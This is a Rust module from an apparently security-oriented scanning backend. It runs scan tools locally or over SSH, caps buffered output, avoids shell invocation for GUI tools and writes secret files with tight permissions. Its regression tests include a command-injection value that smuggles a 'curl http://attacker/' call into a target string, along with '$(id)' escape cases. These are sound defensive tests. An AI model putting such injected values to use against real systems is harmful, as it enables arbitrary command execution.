use anyhow::{anyhow, Result};
use serde_json::Value as JsonValue;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::broadcast;
use tokio::time::{timeout, Duration};
use nix::sys::signal::{killpg, Signal};
use nix::unistd::Pid;

use super::parsers::parse_output;
use super::tool_registry::{build_command, get_tool_max_runtime_secs};

/// Hard cap on how much scan output is buffered in memory per scan.
///
/// STABILITY: previously `output` grew without any bound. A chatty tool
/// (masscan on a wide range, ffuf, a binary dump) could allocate gigabytes in
/// the backend process. With no container memory limit on the scan engine and
/// `vm.overcommit_memory=1` on the host, this was able to wedge the whole
/// machine. 8 MiB is far more than any report needs.
const MAX_OUTPUT_BYTES: usize = 8 * 1024 * 1024;

/// Appends a line to `buf` while respecting [`MAX_OUTPUT_BYTES`].
///
/// Returns `true` the first time the cap is hit so the caller can emit a single
/// truncation notice instead of one per line.
fn push_line_capped(buf: &mut String, line: &str, truncated: &mut bool) -> bool {
    if *truncated {
        return false;
    }
    if buf.len() + line.len() + 1 > MAX_OUTPUT_BYTES {
        buf.push_str("\n...[output truncated: exceeded 8 MiB cap]\n");
        *truncated = true;
        return true;
    }
    buf.push_str(line);
    buf.push('\n');
    false
}

#[allow(dead_code)]
pub struct ScanResult {
    pub output: String,
    pub findings: Option<JsonValue>,
    pub exit_code: Option<i32>,
}

/// Agent SSH connection details for remote scan execution
pub struct AgentSshInfo {
    pub ssh_host: String,
    pub ssh_port: i32,
    pub ssh_username: String,
    pub ssh_key_path: Option<String>,
    /// Passphrase for the private key (decrypted at dispatch time).
    pub ssh_passphrase: Option<String>,
    /// Known host fingerprint stored at agent registration time.
    /// If Some, StrictHostKeyChecking is enabled and fingerprint is verified.
    pub ssh_fingerprint: Option<String>,
}

/// Execute a security scan tool as a subprocess with real-time output streaming.
/// If `agent_ssh` is provided, the scan command is dispatched to the remote agent via SSH.
pub async fn execute_scan(
    tool_name: &str,
    target: &str,
    command_template: Option<&str>,
    tx: &broadcast::Sender<String>,
    scan_id: &str,
    agent_ssh: Option<AgentSshInfo>,
    is_gui_tool: bool,
) -> Result<ScanResult> {
    // Build the command
    let (mut program, mut args) = build_command(tool_name, target, command_template)?;

    // Wrap GUI tools with Xvfb virtual framebuffer for headless execution.
    //
    // SECURITY: never build a shell string here. The previous implementation did
    // `bash -c "<program> <args joined by spaces>"` with no escaping, so a target
    // or parameter containing shell metacharacters (`&` was not on the blocklist)
    // executed arbitrary commands. `xvfb-run` execs the command directly, so we
    // pass program + args as separate argv entries and no shell is involved.
    if is_gui_tool {
        let (p, a) = wrap_gui_command(&program, &args);
        program = p;
        args = a;
        tracing::info!("GUI tool wrapped with Xvfb (no shell): {} {:?}", program, args);
    }

    let (actual_program, actual_args, execution_mode, askpass_file) = if let Some(ssh) = &agent_ssh {
        // Remote execution via SSH
        let remote_cmd = format!("{} {}", shell_escape(&program), args.iter().map(|a| shell_escape(a)).collect::<Vec<_>>().join(" "));
        let mut ssh_args = vec![
            "-o".to_string(), "ConnectTimeout=10".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-p".to_string(), ssh.ssh_port.to_string(),
        ];

        // Use stored fingerprint for host verification (prevents MITM)
        if let Some(fp) = &ssh.ssh_fingerprint {
            ssh_args.push("-o".to_string());
            ssh_args.push("StrictHostKeyChecking=yes".to_string());
            ssh_args.push("-o".to_string());
            ssh_args.push(format!("FingerprintHash=sha256"));
            // Write known_hosts entry to a temp file
            let known_hosts_content = format!("[{}]:{} {}\n", ssh.ssh_host, ssh.ssh_port, fp);
            let tmp_path = format!("/tmp/cybersec_known_hosts_{}", uuid::Uuid::new_v4());
            // Create 0600 up front (never world-readable, not even briefly).
            if write_private_file(&tmp_path, &known_hosts_content).await.is_ok() {
                ssh_args.push("-o".to_string());
                ssh_args.push(format!("UserKnownHostsFile={}", tmp_path));
                // CLEANUP: these files were never removed and accumulated in /tmp
                // forever. SSH only reads known_hosts during the handshake, so a
                // short delay is safe even for long-running scans.
                let doomed = tmp_path.clone();
                tokio::spawn(async move {
                    tokio::time::sleep(std::time::Duration::from_secs(120)).await;
                    let _ = tokio::fs::remove_file(&doomed).await;
                });
            }
        } else {
            // No fingerprint stored — refuse connection for security
            return Err(anyhow!(
                "Agent {} has no stored SSH fingerprint. Re-register the agent to store its fingerprint.",
                ssh.ssh_host
            ));
        }

        if let Some(key_path) = &ssh.ssh_key_path {
            ssh_args.push("-i".to_string());
            ssh_args.push(key_path.clone());
        }
        // Passphrase-protected key: OpenSSH ≥8.4 forces the SSH_ASKPASS helper
        // (BatchMode must be OFF for that, so it is only added when needed).
        let mut askpass_path: Option<String> = None;
        if let Some(pp) = &ssh.ssh_passphrase {
            if !pp.is_empty() {
                let ap = format!("/tmp/cybersec_askpass_{}", uuid::Uuid::new_v4());
                let esc = pp.replace('\'', "'\\''");
                // RACE FIX: the file used to be written with the default umask
                // (typically 0644) and only chmod'ed to 0700 afterwards, leaving a
                // window where any local user could read the SSH key passphrase.
                // It is now created 0700 atomically.
                if write_private_file_mode(&ap, &format!("#!/bin/sh\necho '{}'\n", esc), 0o700).await.is_ok() {
                    askpass_path = Some(ap);
                }
            }
        }
        if askpass_path.is_none() {
            ssh_args.push("-o".to_string());
            ssh_args.push("BatchMode=yes".to_string());
        }
        ssh_args.push(format!("{}@{}", ssh.ssh_username, ssh.ssh_host));
        ssh_args.push(remote_cmd);
        ("ssh".to_string(), ssh_args, "remote", askpass_path)
    } else {
        // Local execution — verify binary exists
        let which = Command::new("which")
            .arg(&program)
            .output()
            .await?;
        if !which.status.success() {
            return Err(anyhow!("Tool binary not found: {}", program));
        }
        (program.clone(), args, "local", None)
    };

    // Send scan phase update
    let _ = tx.send(serde_json::json!({
        "type": "output",
        "scan_id": scan_id,
        "phase": "executing",
        "execution_mode": execution_mode,
        "line": format!("Starting {} on {} ({})", tool_name, target, execution_mode),
        "data": format!("Starting {} on {} ({})", tool_name, target, execution_mode)
    }).to_string());

    // Spawn process in its own process group for clean cleanup
    let mut cmd = Command::new(&actual_program);
    cmd.args(&actual_args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .process_group(0); // Create new process group so we can kill entire tree
    if let Some(ap) = &askpass_file {
        cmd.env("SSH_ASKPASS", ap);
        cmd.env("SSH_ASKPASS_REQUIRE", "force");
        cmd.env("DISPLAY", ":0");
    }
    let mut child = cmd
        .spawn()
        .map_err(|e| anyhow!("Failed to spawn {}: {}", program, e))?;

    let child_pid = child.id().unwrap_or(0) as i32;
    if let Some(ap) = &askpass_file {
        let ap = ap.clone();
        tokio::spawn(async move {
            tokio::time::sleep(std::time::Duration::from_secs(45)).await;
            let _ = tokio::fs::remove_file(&ap).await;
        });
    }


    let stdout = child.stdout.take().ok_or_else(|| anyhow!("No stdout"))?;
    let stderr = child.stderr.take().ok_or_else(|| anyhow!("No stderr"))?;

    let mut stdout_reader = BufReader::new(stdout).lines();
    let mut stderr_reader = BufReader::new(stderr).lines();

    let mut output = String::new();
    let mut stderr_output = String::new();
    let mut stderr_done = false;
    let mut stdout_truncated = false;
    let mut stderr_truncated = false;

    let tx_clone = tx.clone();
    let scan_id_owned = scan_id.to_string();

    // Spawn heartbeat task for local execution
    let heartbeat_tx = tx.clone();
    let heartbeat_scan_id = scan_id.to_string();
    let heartbeat_handle = tokio::spawn(async move {
        let mut counter = 0u32;
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            counter += 1;
            let elapsed = counter * 5;
            let _ = heartbeat_tx.send(serde_json::json!({
                "type": "heartbeat",
                "scan_id": heartbeat_scan_id,
                "line": format!("⏳ Scan in progress... ({}s elapsed)", elapsed),
                "data": format!("⏳ Scan in progress... ({}s elapsed)", elapsed),
                "heartbeat": true
            }).to_string());
        }
    });

    // Per-tool runtime override (defaults to 900s); slow tools like nikto/gitleaks get more headroom.
    let max_runtime_secs = get_tool_max_runtime_secs(tool_name);

    // Read stdout and stderr concurrently with timeout
    let result = timeout(Duration::from_secs(max_runtime_secs), async {
        loop {
            if stderr_done {
                // Only read stdout
                match stdout_reader.next_line().await {
                    Ok(Some(line)) => {
                        if push_line_capped(&mut output, &line, &mut stdout_truncated) {
                            tracing::warn!("scan {} output hit {} byte cap; truncating", scan_id_owned, MAX_OUTPUT_BYTES);
                        }
                        let _ = tx_clone.send(serde_json::json!({
                            "type": "output",
                            "scan_id": scan_id_owned,
                            "line": line,
                            "data": line
                        }).to_string());
                    }
                    Ok(None) => break,
                    Err(e) => {
                        tracing::warn!("stdout read error: {}", e);
                        break;
                    }
                }
            } else {
                tokio::select! {
                    line = stdout_reader.next_line() => {
                        match line {
                            Ok(Some(line)) => {
                                if push_line_capped(&mut output, &line, &mut stdout_truncated) {
                                    tracing::warn!("scan {} output hit {} byte cap; truncating", scan_id_owned, MAX_OUTPUT_BYTES);
                                }
                                let _ = tx_clone.send(serde_json::json!({
                                    "type": "output",
                                    "scan_id": scan_id_owned,
                                    "line": line,
                                    "data": line
                                }).to_string());
                            }
                            Ok(None) => break,
                            Err(e) => {
                                tracing::warn!("stdout read error: {}", e);
                                break;
                            }
                        }
                    }
                    line = stderr_reader.next_line() => {
                        match line {
                            Ok(Some(line)) => {
                                push_line_capped(&mut stderr_output, &line, &mut stderr_truncated);
                            }
                            Ok(None) => { stderr_done = true; }
                            Err(_) => { stderr_done = true; }
                        }
                    }
                }
            }
        }
    })
    .await;

    if result.is_err() {
        // LEAK FIX: the heartbeat task must be aborted on *every* exit path.
        // Previously this early return skipped `heartbeat_handle.abort()`, so a
        // timed-out scan left a task looping forever, broadcasting SSE frames
        // for a dead scan — one leaked task per timeout.
        heartbeat_handle.abort();
        // Timeout — kill the entire process group (not just direct child)
        // Guard: never send signal to PID 0 (would kill entire process group of the server)
        if child_pid > 0 {
            let _ = killpg(Pid::from_raw(child_pid), Signal::SIGKILL);
        } else {
            tracing::warn!("Could not get child PID for scan {}, attempting direct kill", scan_id);
        }
        let _ = child.kill().await;
        return Err(anyhow!("Scan timed out after {} seconds", max_runtime_secs));
    }

    // Stop heartbeat
    heartbeat_handle.abort();

    let status = child.wait().await?;
    let exit_code = status.code();

    // Combine stderr into output — append after stdout (many tools write to stderr)
    if !stderr_output.trim().is_empty() {
        if output.trim().is_empty() {
            output = stderr_output;
        } else {
            output.push_str("\n--- STDERR ---\n");
            output.push_str(&stderr_output);
        }
    }

    // Parse output for structured findings
    let findings = parse_output(tool_name, &output);

    // Send completion
    let _ = tx.send(serde_json::json!({
        "type": "complete",
        "scan_id": scan_id,
        "status": "completed",
        "exit_code": exit_code,
        "output_length": output.len(),
        "result": {
            "status": if exit_code == Some(0) { "completed" } else { "failed" },
            "exit_code": exit_code,
            "output_length": output.len()
        }
    }).to_string());

    Ok(ScanResult {
        output,
        findings,
        exit_code,
    })
}

/// Wraps a command for headless execution under Xvfb.
///
/// Returns `(program, argv)` where every original argument stays a **separate**
/// argv entry. `xvfb-run` execs the target directly, so no shell ever parses
/// these strings — a target containing `&`, `;` or `$()` is passed through as a
/// literal argument instead of being interpreted.
fn wrap_gui_command(program: &str, args: &[String]) -> (String, Vec<String>) {
    let mut out = Vec::with_capacity(args.len() + 3);
    out.push("--auto-servernum".to_string());
    out.push("--server-args=-screen 0 1024x768x24".to_string());
    out.push(program.to_string());
    out.extend(args.iter().cloned());
    ("xvfb-run".to_string(), out)
}

/// Writes `content` to `path`, creating it with mode 0600 atomically.
async fn write_private_file(path: &str, content: &str) -> std::io::Result<()> {
    write_private_file_mode(path, content, 0o600).await
}

/// Writes `content` to `path`, creating it with the given mode atomically.
///
/// Using `OpenOptions::mode` means the file never exists with looser
/// permissions, unlike `write()` followed by `set_permissions()`.
async fn write_private_file_mode(path: &str, content: &str, mode: u32) -> std::io::Result<()> {
    use std::os::unix::fs::OpenOptionsExt;
    use tokio::io::AsyncWriteExt;
    let mut f = tokio::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(mode)
        .open(path)
        .await?;
    f.write_all(content.as_bytes()).await?;
    f.flush().await
}

/// Escape a string for safe inclusion in a remote shell command
fn shell_escape(s: &str) -> String {
    if s.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '/' || c == ':') {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

// ── Tests ──────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── push_line_capped (#29: unbounded output buffer) ───────────────

    #[test]
    fn push_line_capped_appends_normal_lines() {
        let mut buf = String::new();
        let mut trunc = false;
        assert!(!push_line_capped(&mut buf, "hello", &mut trunc));
        assert!(!push_line_capped(&mut buf, "world", &mut trunc));
        assert_eq!(buf, "hello\nworld\n");
        assert!(!trunc);
    }

    #[test]
    fn push_line_capped_stops_at_the_cap() {
        let mut buf = String::new();
        let mut trunc = false;
        let chunk = "x".repeat(64 * 1024);
        let mut hit = false;
        // Far more than MAX_OUTPUT_BYTES worth of data.
        for _ in 0..256 {
            if push_line_capped(&mut buf, &chunk, &mut trunc) {
                hit = true;
            }
        }
        assert!(hit, "cap should have been reported");
        assert!(trunc, "truncation flag should be set");
        assert!(
            buf.len() <= MAX_OUTPUT_BYTES + 64,
            "buffer grew past the cap: {} bytes",
            buf.len()
        );
        assert!(buf.ends_with("...[output truncated: exceeded 8 MiB cap]\n"));
    }

    #[test]
    fn push_line_capped_reports_truncation_only_once() {
        let mut buf = String::new();
        let mut trunc = false;
        let chunk = "y".repeat(1024 * 1024);
        let reports = (0..32)
            .filter(|_| push_line_capped(&mut buf, &chunk, &mut trunc))
            .count();
        assert_eq!(reports, 1, "truncation must be reported exactly once");
    }

    #[test]
    fn push_line_capped_ignores_writes_after_truncation() {
        let mut buf = String::new();
        let mut trunc = true; // already truncated
        assert!(!push_line_capped(&mut buf, "ignored", &mut trunc));
        assert!(buf.is_empty());
    }

    // ── wrap_gui_command (#9: shell injection via GUI tools) ──────────

    #[test]
    fn wrap_gui_command_never_invokes_a_shell() {
        let (prog, args) = wrap_gui_command("wireshark", &["-i".into(), "eth0".into()]);
        assert_eq!(prog, "xvfb-run");
        assert!(
            !args.iter().any(|a| a == "bash" || a == "sh" || a == "-c"),
            "no shell may appear in argv: {args:?}"
        );
    }

    #[test]
    fn wrap_gui_command_keeps_arguments_separate() {
        let (_, args) = wrap_gui_command("tool", &["-t".into(), "example.com".into()]);
        assert_eq!(
            args,
            vec![
                "--auto-servernum".to_string(),
                "--server-args=-screen 0 1024x768x24".to_string(),
                "tool".to_string(),
                "-t".to_string(),
                "example.com".to_string(),
            ]
        );
    }

    #[test]
    fn wrap_gui_command_passes_metacharacters_through_literally() {
        // Regression: the old implementation joined argv with spaces into
        // `bash -c`, so this target executed `curl` as a second command.
        let evil = "example.com & curl http://attacker/";
        let (prog, args) = wrap_gui_command("nmap", &[evil.to_string()]);
        assert_eq!(prog, "xvfb-run");
        assert_eq!(
            args.last().map(String::as_str),
            Some(evil),
            "the metacharacter payload must survive as ONE literal argv entry"
        );
        assert_eq!(
            args.iter().filter(|a| a.contains("curl")).count(),
            1,
            "payload must not be split into a separate command"
        );
    }

    // ── shell_escape (SSH remote command construction) ────────────────

    #[test]
    fn shell_escape_leaves_safe_strings_untouched() {
        assert_eq!(shell_escape("nmap"), "nmap");
        assert_eq!(shell_escape("/usr/bin/nmap"), "/usr/bin/nmap");
        assert_eq!(shell_escape("example.com"), "example.com");
        assert_eq!(shell_escape("https://example.com:443"), "https://example.com:443");
    }

    #[test]
    fn shell_escape_quotes_metacharacters() {
        assert_eq!(shell_escape("a;b"), "'a;b'");
        assert_eq!(shell_escape("a b"), "'a b'");
        assert_eq!(shell_escape("$(id)"), "'$(id)'");
        assert_eq!(shell_escape("a&b"), "'a&b'");
    }

    #[test]
    fn shell_escape_neutralises_embedded_single_quotes() {
        assert_eq!(shell_escape("it's"), r#"'it'\''s'"#);
    }
}
